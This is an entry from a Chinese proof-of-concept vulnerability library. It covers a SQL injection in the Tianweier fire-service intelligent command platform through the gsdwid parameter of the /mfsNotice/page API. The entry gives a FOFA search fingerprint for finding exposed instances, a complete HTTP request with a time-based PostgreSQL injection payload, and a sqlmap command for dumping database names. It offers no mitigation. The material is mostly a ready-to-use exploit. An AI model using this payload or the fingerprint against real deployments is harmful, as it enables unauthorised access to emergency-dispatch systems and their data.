---
fofa: "body="
source: "wy876 漏洞文库"
---

# 天维尔消防智能指挥平台API接口页面sql注入

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">天维尔消防智能指挥平台是一个采用先进的信息技术和通信技术的系统，能够快速准确地获取和处理突发事件的信息，实现对灾害现场的实时监控和指挥调度，有效提升应急救援工作的能力和水平。天为消防智能指挥平台存在一个漏洞，影响组件API接口中/mfsNotice/page文件的未知代码。通过操纵参数gsdwid可以导致SQL注入</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 天维尔消防智能指挥平台

# 三、资产测绘
+ fofa`body="1997-2020 天维尔信息科技股份有限公司"`
+ 特征

# 四、漏洞复现
```java
POST /twms-service-mfs/mfsNotice/page HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 103

{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(3)) AND ('oJoi'='oJoi"},"hgubmt748n4":"="}
```


SQLMAP命令

```java
python3 sqlmap.py -r payload.txt --technique=T --time-sec 3  --dbs -v 3 --level 5 --random-agent
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ch6s7681pfvp2rws>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
